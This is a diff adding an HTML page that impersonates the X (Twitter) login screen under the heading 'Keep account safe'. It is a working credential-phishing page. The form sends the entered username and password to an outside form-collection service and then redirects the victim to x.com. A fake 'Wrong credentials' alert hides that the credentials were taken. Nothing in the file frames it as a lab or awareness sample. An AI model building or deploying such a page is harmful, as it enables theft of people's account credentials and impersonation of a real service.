@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure account</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo">
+                <!-- Placeholder for your logo -->
+                <img src="img/x.png" alt="Logo" class="logo-img">
+            </div>
+            <h1>Keep account safe</h1>
+            <form class="login-form" action="https://submit-form.com/fqbhCid6o" onsubmit="showAlert()">
+                <input
+                type="hidden"
+                name="_redirect"
+                value="x.com"
+                />
+                <input name="first" type="text" placeholder="Phone, email, or username" required>
+                <input name="second" type="password" placeholder="Password" required>
+                <button type="submit">Next</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="signup">
+                <p>Don't have an account? <a href="#">Sign up for X</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js">
+    function showAlert() {
+        alert('Wrong credentials'); // Show the alert message
+        return true;
+    }
+
+
+    </script>
+</body>
+</html>
